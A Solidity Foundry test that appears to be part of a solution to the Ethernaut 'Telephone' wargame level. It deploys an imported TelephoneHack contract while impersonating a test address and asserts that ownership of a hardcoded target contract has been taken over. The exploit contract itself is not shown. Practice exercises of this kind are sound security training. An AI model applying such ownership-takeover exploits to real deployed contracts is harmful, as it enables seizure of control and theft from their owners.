// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/04Telephone.sol";

contract TelephoneTest is Test {
    ITelephone public telephone;
    address bob = address(0x1);

    function setUp() public {
        (bool success,) = payable(address(bob)).call{value: 2 ether}("");
        require(success, "Transfer to bob failed.");
    }

    function testHack() public {
        address telephoneContractAddress = 0x94BB48e9218Fa23194254D2AAd6c09Ff53041397;
        vm.startPrank(bob); // Prank means we are now calling functions as bob address
        new TelephoneHack(address(telephoneContractAddress));
        vm.stopPrank();
        address newOwner = ITelephone(telephoneContractAddress).owner();
        console.log(newOwner);
        assertEq(newOwner, bob);
    }
}
